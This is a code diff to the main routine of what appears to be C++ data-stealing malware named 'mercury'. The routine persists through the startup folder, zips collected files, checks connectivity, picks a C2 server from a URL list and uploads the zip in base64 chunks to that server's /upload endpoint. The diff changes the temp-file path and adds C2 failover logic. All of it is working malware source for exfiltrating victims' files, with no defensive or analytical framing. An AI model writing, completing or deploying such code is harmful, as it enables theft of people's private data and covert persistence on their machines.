@@ -70,11 +70,13 @@ void GenZip() {
 
 int main() {
     std::wstring uid;
+    std::string tmpDir = TmpPath();
+    std::string zipFile = tmpDir + "zipped.zip";
 
     // Mode 1: run once and then > cleanup > self destruct
     if (ONETIMERUN) {
         // If the zip file doesn't exist, it's the first run
-        if (!std::ifstream(zipDestStr).good()) {
+        if (!std::filesystem::exists(zipFile)) {
             PersistOnMachine(); // Add mercury to startup folder
             GenZip();           // Process files and create a zip file
 
@@ -105,36 +107,42 @@ int main() {
 
         // As long as the file upload status is incomplete, keep uploading bytes
         do {
-            // Check file status
-            std::wstring FileStatusURL = C2 + L"/file_status";
-            nlohmann::json UidJson = { {"uid", WStringToString(uid)} };
-            std::string FileStatusResp = SendData(L"POST", FileStatusURL, L"", UidJson, L"");
-            auto FileJSONResp = nlohmann::json::parse(FileStatusResp);
+            bool ReachIntranet = googleConn();
+            if (ReachIntranet) {
+                C2 = C2Conn(URLS);
 
-            if (!(FileJSONResp.contains("status") && FileJSONResp["status"] == "incomplete")) {
-                break;
+                // Check file status
+                std::wstring FileStatusURL = C2 + L"/file_status";
+                nlohmann::json UidJson = { {"uid", WStringToString(uid)} };
+                std::string FileStatusResp = SendData(L"POST", FileStatusURL, L"", UidJson, L"");
+                auto FileJSONResp = nlohmann::json::parse(FileStatusResp);
+
+                if (!(FileJSONResp.contains("status") && FileJSONResp["status"] == "incomplete")) {
+                    break;
+                }
+
+                std::cout << "JSON response: " << FileJSONResp << std::endl;
+
+                // Read required bytes from the server's JSON response:
+                int start_byte = FileJSONResp["start_byte"];
+                int end_byte = FileJSONResp["end_byte"];
+
+                // Grab the required bytes from start to end and encode them into base64
+                std::vector<char> requiredBytes = RetReqBytes(zipFile, start_byte, end_byte);
+                std::string base64Encoded = EncodeBase64(std::string(requiredBytes.begin(), requiredBytes.end()));
+
+                // Construct a JSON object that contains the encoded file bytes and the client's UID:
+                nlohmann::json EncodedBytes;
+                EncodedBytes["file_data"] = base64Encoded;
+                EncodedBytes["uid"] = WStringToString(uid);
+
+                // Upload the requested bytes to the server:
+                std::wstring FileUploadURL = C2 + L"/upload";
+                std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
+                std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
+                Sleep(10000);
             }
-
-            std::cout << "JSON response: " << FileJSONResp << std::endl;
-
-            // Read required bytes from the server's JSON response:
-            int start_byte = FileJSONResp["start_byte"];
-            int end_byte = FileJSONResp["end_byte"];
-
-            // Grab the required bytes from start to end and encode them into base64
-            std::vector<char> requiredBytes = RetReqBytes(zipDestStr, start_byte, end_byte);
-            std::string base64Encoded = EncodeBase64(std::string(requiredBytes.begin(), requiredBytes.end()));
-
-            // Construct a JSON object that contains the encoded file bytes and the client's UID:
-            nlohmann::json EncodedBytes;
-            EncodedBytes["file_data"] = base64Encoded;
-            EncodedBytes["uid"] = WStringToString(uid);
-
-            // Upload the requested bytes to the server:
-            std::wstring FileUploadURL = C2 + L"/upload";
-            std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
-            std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
-            Sleep(10000);
+            
 
         } while (true);
 
